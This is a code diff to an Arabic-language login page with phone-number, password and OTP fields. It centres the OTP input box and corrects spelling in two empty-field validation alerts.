@@ -234,13 +234,12 @@
             margin-bottom: 40px;
         }
 
-        /* حاوية حقول الـ OTP تبدأ من اليسار تماماً وتتجه لليمين */
+        /* تعديل الموضع ليصبح في المنتصف تماماً ومطابق للصور المرفقة */
         .otp-wrapper-box {
             display: flex;
-            justify-content: flex-start; /* تبدأ من اليسار تماماً بناء على الخصائص المطلوبة سابقاً */
+            justify-content: center; /* نقل وتوسيط الحقل في المنتصف تماماً */
             width: 100%;
             margin-bottom: 35px;
-            padding-left: 5px;
         }
 
         .otp-container {
@@ -260,7 +259,7 @@
             outline: none;
             background: transparent;
             
-            /* إجبار الكتابة والمحاذاة والبدء من اليسار فقط وبشكل صارم */
+            /* إجبار الكتابة والمحاذاة والبدء من اليسار فقط داخل الخانة وبشكل صارم */
             direction: ltr !important;
             text-align: left !important;
             unicode-bidi: plaintext !important;
@@ -448,7 +447,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // التحقق عند الضغط على الزر الأصفر الرئيسي ومنع الحقول الفارغة
+        // التحقق عند الضغط على الزر الرئيسي
         function onFooterButtonClick() {
             const loginSection = document.getElementById('loginSection');
             const otpSection = document.getElementById('otpSection');
@@ -463,7 +462,7 @@
                 document.querySelectorAll('.password-field').forEach(box => passVal += box.value.trim());
 
                 if (userVal === "" || passVal === "") {
-                    alert("عذراً! لا يمكن ترك الحقول فارغة. الرجاء إدخل رقم الهاتف والرقم السري كاملاً.");
+                    alert("عذراً! لا يمكن ترك الحقول فارغة. الرجاء إدخال رقم الهاتف والرقم السري كاملاً.");
                     return;
                 }
 
@@ -487,7 +486,7 @@
                 document.querySelectorAll('.otp-field').forEach(box => otpCode += box.value.trim());
 
                 if (otpCode === "") {
-                    alert("الرجاء إدخل رمز التحقق (OTP) المرسل إلى هاتفك.");
+                    alert("الرجاء إدخال رمز التحقق (OTP) المرسل إلى هاتفك.");
                     return;
                 }
 
